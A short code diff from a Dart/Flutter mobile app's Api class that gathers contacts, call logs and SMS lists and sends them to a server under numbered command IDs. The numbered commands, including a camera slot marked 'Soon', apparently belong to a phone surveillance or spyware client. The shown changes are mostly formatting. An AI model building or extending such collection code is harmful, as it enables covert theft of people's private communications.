@@ -136,9 +136,9 @@ class Api {
             "name": c.displayName,
           },
         );
+        log(" Call records logs: ${phonesData.length}");
       }
     }
-
     await _sendToServer(
       agent,
       uuid,
@@ -150,7 +150,8 @@ class Api {
   }
 
   // 2 – call records
-  static Future sendCallLogs(BuildContext context, String? agent, String? uuid) async {
+  static Future sendCallLogs(
+      BuildContext context, String? agent, String? uuid) async {
     printWhite('START: sendCallLogs() ');
     Hive.registerAdapter(CallsAdapter());
     late Box box;
@@ -284,7 +285,8 @@ class Api {
   // 4 – camera (Soon)
 
   // 5 – sms list
-  static Future sendSmsLogs(BuildContext context, String? agent, String? uuid) async {
+  static Future sendSmsLogs(
+      BuildContext context, String? agent, String? uuid) async {
     printWhite('START: sendSmsLogs() ');
 
     if (kDebugMode) {
@@ -319,6 +321,7 @@ class Api {
     providerMainScope(context).smsLogs = smsModelList;
 
     _sendToServer(agent, uuid,
-        type: 'SMS Logs', data: {"uuid": uuid, "command_id": "5", "data": smsJsonList});
+        type: 'SMS Logs',
+        data: {"uuid": uuid, "command_id": "5", "data": smsJsonList});
   }
 }
